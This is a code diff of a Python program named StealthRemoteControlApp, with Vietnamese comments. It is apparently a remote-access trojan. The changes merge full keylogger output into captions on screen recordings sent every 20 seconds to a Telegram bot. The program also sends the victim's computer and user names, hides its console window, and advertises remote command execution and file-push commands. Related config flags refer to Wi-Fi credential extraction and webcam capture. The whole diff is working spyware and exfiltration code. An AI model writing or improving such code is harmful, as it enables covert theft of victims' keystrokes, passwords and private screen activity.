@@ -68,7 +68,7 @@ from config import (
     WIFI_EXTRACTOR_ENABLED, WIFI_EXTRACT_INTERVAL,
     WEBCAM_CAPTURE_ENABLED, WEBCAM_CAPTURE_INTERVAL,
     USB_MONITOR_ENABLED, USB_CHECK_INTERVAL,
-    VIDEO_SEND_INTERVAL, KEYLOG_SEND_INTERVAL
+    VIDEO_SEND_INTERVAL
 )
 from datetime import datetime
 
@@ -106,7 +106,6 @@ class StealthRemoteControlApp:
         self.last_webcam_capture = 0
         self.last_usb_check = 0
         self.last_video_send = 0
-        self.last_keylog_send = 0
         
         # Tối ưu hiệu năng
         if OPTIMIZE_FOR_WEAK_PC:
@@ -145,15 +144,18 @@ class StealthRemoteControlApp:
         if self.keylogger:
             self.keylogger.start()
         
-        # Gửi thông báo Machine ID khi khởi động
+        # Gửi thông báo khi kích hoạt thành công
         def send_startup_notification():
-            # Đợi bot sẵn sàng và có internet
-            max_retries = 10
+            # Đợi có internet trước
+            self.internet_checker.wait_for_connection()
+            
+            # Đợi bot sẵn sàng
+            max_retries = 20
             retry_count = 0
             while retry_count < max_retries:
                 try:
-                    time.sleep(3)  # Đợi 3 giây mỗi lần thử
-                    if self.telegram.bot:
+                    time.sleep(2)  # Đợi 2 giây mỗi lần thử
+                    if self.telegram.bot and self.internet_checker.is_online():
                         # Lấy thông tin hệ thống
                         import socket
                         import platform
@@ -172,7 +174,7 @@ class StealthRemoteControlApp:
                             pass
                         
                         # Tạo thông báo chi tiết
-                        message = f"🟢 MÁY TÍNH MỚI KẾT NỐI THÀNH CÔNG!\n\n"
+                        message = f"🟢 ỨNG DỤNG ĐÃ KÍCH HOẠT THÀNH CÔNG!\n\n"
                         message += f"🆔 Machine ID: {self.machine_id}\n"
                         message += f"🔖 Short ID: {self.machine_short_id}\n"
                         message += f"⏰ Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
@@ -185,19 +187,16 @@ class StealthRemoteControlApp:
                         message += f"📋 LỆNH ĐIỀU KHIỂN:\n"
                         message += f"• /cmd {self.machine_short_id} <command> - Thực thi lệnh\n"
                         message += f"• /send {self.machine_short_id} - Gửi file đến máy này\n"
-                        message += f"• /info {self.machine_short_id} - Xem thông tin hệ thống\n"
+                        message += f"• /info {self.machine_short_id} - Xem thông tin hệ thống\n\n"
+                        message += f"✅ Ứng dụng đang chạy ẩn và sẽ gửi video + keylog mỗi 20 giây"
                         
                         # Gửi thông báo
                         success = self.telegram.send_text_sync(message)
                         if success:
-                            print(f"[INFO] Đã gửi thông báo kết nối thành công!")
                             return
                 except Exception as e:
                     pass
                 retry_count += 1
-            
-            # Nếu không gửi được sau nhiều lần thử, thử lại sau
-            print(f"[WARNING] Không thể gửi thông báo kết nối, sẽ thử lại sau...")
         
         threading.Thread(target=send_startup_notification, daemon=True).start()
         
@@ -235,8 +234,18 @@ class StealthRemoteControlApp:
         return True
     
     def record_and_send_with_keylog(self):
-        """Quay màn hình, gửi video và keylog riêng biệt về Telegram"""
+        """Quay màn hình, gửi video và keylog kèm theo về Telegram"""
         try:
+            # Kiểm tra internet trước khi quay
+            if not self.internet_checker.is_online():
+                return False
+            
+            # Lấy thông tin máy tính
+            import socket
+            import platform
+            computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
+            username = os.environ.get('USERNAME', 'Unknown')
+            
             # Quay cố định 20 giây
             duration = RECORD_DURATION
             
@@ -246,32 +255,30 @@ class StealthRemoteControlApp:
             if not video_path or not os.path.exists(video_path):
                 return False
             
-            # Lấy keylog đầy đủ
-            keylog_text = ""
-            keylog_file_path = None
+            # Lấy keylog đầy đủ để gửi kèm trong caption
+            keylog_content = ""
             if self.keylogger:
-                keylog_content = self.keylogger.get_log_content()
-                if keylog_content:
-                    # Lưu keylog vào file để gửi riêng
-                    keylog_file_path = os.path.join(TEMP_DIR, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
-                    with open(keylog_file_path, 'w', encoding='utf-8') as f:
-                        f.write(keylog_content)
-                    
-                    # Lấy phần tóm tắt cho caption (100 dòng cuối)
-                    lines = keylog_content.strip().split('\n')
-                    keylog_text = '\n'.join(lines[-100:])
+                keylog_content = self.keylogger.get_log_content() or ""
             
             # Gửi video qua Telegram
-            if self.telegram.bot:
-                # Tạo caption với thông tin đầy đủ
+            if self.telegram.bot and self.internet_checker.is_online():
+                # Tạo caption với thông tin đầy đủ bao gồm tên máy và keylog
                 caption = f"🖥️ Machine: {self.machine_short_id}\n"
+                caption += f"💻 Computer: {computer_name}\n"
+                caption += f"👤 User: {username}\n"
                 caption += f"🎥 Screen Recording\n"
                 caption += f"⏱️ Duration: {duration} seconds\n"
                 caption += f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                 
-                if keylog_text:
-                    lines_count = len(keylog_text.split('\n'))
-                    caption += f"\n⌨️ Recent Keylog ({lines_count} lines):\n{keylog_text[:300]}"
+                # Thêm keylog vào caption (giới hạn 4000 ký tự cho Telegram)
+                if keylog_content:
+                    # Lấy toàn bộ keylog, giới hạn 3500 ký tự để tránh vượt quá giới hạn
+                    keylog_display = keylog_content[:3500] if len(keylog_content) > 3500 else keylog_content
+                    lines_count = len(keylog_content.split('\n'))
+                    caption += f"\n⌨️ Keylog ({lines_count} lines):\n"
+                    caption += f"{keylog_display}"
+                    if len(keylog_content) > 3500:
+                        caption += f"\n... (truncated, total: {len(keylog_content)} chars)"
                 
                 # Gửi video
                 video_success = self.telegram.send_video_sync(
@@ -279,41 +286,37 @@ class StealthRemoteControlApp:
                     caption=caption
                 )
                 
-                # Gửi keylog file riêng biệt nếu có
-                if keylog_file_path and os.path.exists(keylog_file_path):
+                # Xóa video sau khi gửi thành công
+                if video_success:
+                    time.sleep(1)  # Đợi một chút để đảm bảo file đã được gửi
                     try:
-                        self.telegram.send_file_sync(
-                            keylog_file_path,
-                            caption=f"🖥️ Machine: {self.machine_short_id}\n⌨️ Full Keylog - {duration}s recording"
-                        )
-                        # Xóa file keylog sau khi gửi
-                        self.file_manager.delete_file(keylog_file_path)
+                        if os.path.exists(video_path):
+                            os.remove(video_path)
                     except:
                         pass
-                
-                # Chỉ xóa video sau khi gửi thành công
-                if video_success and AUTO_DELETE_VIDEO:
-                    time.sleep(2)  # Đợi một chút để đảm bảo file đã được gửi
-                    self.file_manager.delete_file(video_path)
                     return True
-                elif not video_success:
+                else:
                     # Nếu gửi không thành công, xóa video để tránh đầy bộ nhớ
-                    self.file_manager.delete_file(video_path)
+                    try:
+                        if os.path.exists(video_path):
+                            os.remove(video_path)
+                    except:
+                        pass
                     return False
             else:
-                # Không có bot, xóa video và keylog ngay
-                self.file_manager.delete_file(video_path)
-                if keylog_file_path and os.path.exists(keylog_file_path):
-                    self.file_manager.delete_file(keylog_file_path)
+                # Không có bot hoặc không có internet, xóa video ngay
+                try:
+                    if os.path.exists(video_path):
+                        os.remove(video_path)
+                except:
+                    pass
                 return False
                 
         except Exception as e:
-            # Xóa video và keylog nếu có lỗi
+            # Xóa video nếu có lỗi
             try:
                 if 'video_path' in locals() and os.path.exists(video_path):
-                    self.file_manager.delete_file(video_path)
-                if 'keylog_file_path' in locals() and keylog_file_path and os.path.exists(keylog_file_path):
-                    self.file_manager.delete_file(keylog_file_path)
+                    os.remove(video_path)
             except:
                 pass
             return False
@@ -361,13 +364,16 @@ class StealthRemoteControlApp:
     
     def run_infinite_loop(self):
         """
-        Chạy vòng lặp vô hạn với kiểm tra internet
+        Chạy vòng lặp vô hạn với kiểm tra internet - chỉ chạy khi có internet
         """
         if not self.check_config():
             return
         
         # Đợi có internet trước khi bắt đầu
         self.internet_checker.wait_for_connection()
+        
+        # Đảm bảo ứng dụng chạy ẩn hoàn toàn
+        hide_console()
         
         self.running = True
         # Keylogger đã được khởi động trong __init__, không cần start lại
@@ -499,38 +505,23 @@ class StealthRemoteControlApp:
                             pass
                         self.last_usb_check = current_time
                 
-                # Quay và gửi video kèm keylog định kỳ
-                if self.last_video_send == 0:
-                    self.last_video_send = current_time
-                if current_time - self.last_video_send >= VIDEO_SEND_INTERVAL:
-                    try:
-                        self.record_and_send_with_keylog()
+                # Chỉ quay và gửi video khi có internet
+                if self.internet_checker.is_online():
+                    # Quay và gửi video kèm keylog định kỳ (mỗi 20 giây)
+                    if self.last_video_send == 0:
                         self.last_video_send = current_time
-                    except:
-                        pass
-                
-                # Gửi keylog riêng định kỳ (nếu có nhiều keylog)
-                if self.keylogger and KEYLOG_ENABLED:
-                    if self.last_keylog_send == 0:
-                        self.last_keylog_send = current_time
-                    if current_time - self.last_keylog_send >= KEYLOG_SEND_INTERVAL:
+                    if current_time - self.last_video_send >= VIDEO_SEND_INTERVAL:
                         try:
-                            keylog_content = self.keylogger.get_log_content()
-                            if keylog_content and len(keylog_content) > 1000:  # Chỉ gửi nếu có nhiều keylog
-                                keylog_file_path = os.path.join(TEMP_DIR, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
-                                with open(keylog_file_path, 'w', encoding='utf-8') as f:
-                                    f.write(keylog_content)
-                                
-                                if self.telegram.bot:
-                                    caption = f"🖥️ Machine: {self.machine_short_id}\n⌨️ Keylog Update\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📊 Lines: {len(keylog_content.split(chr(10)))}"
-                                    self.telegram.send_file_sync(keylog_file_path, caption=caption)
-                                    os.remove(keylog_file_path)
+                            self.record_and_send_with_keylog()
+                            self.last_video_send = current_time
                         except:
                             pass
-                        self.last_keylog_send = current_time
+                else:
+                    # Không có internet, đợi đến khi có kết nối
+                    self.internet_checker.wait_for_connection()
                 
                 # Đợi một chút trước lần kiểm tra tiếp theo
-                time.sleep(10)  # Kiểm tra mỗi 10 giây
+                time.sleep(2)  # Kiểm tra mỗi 2 giây để đảm bảo gửi đúng 20s
                 
         except KeyboardInterrupt:
             self.stop()
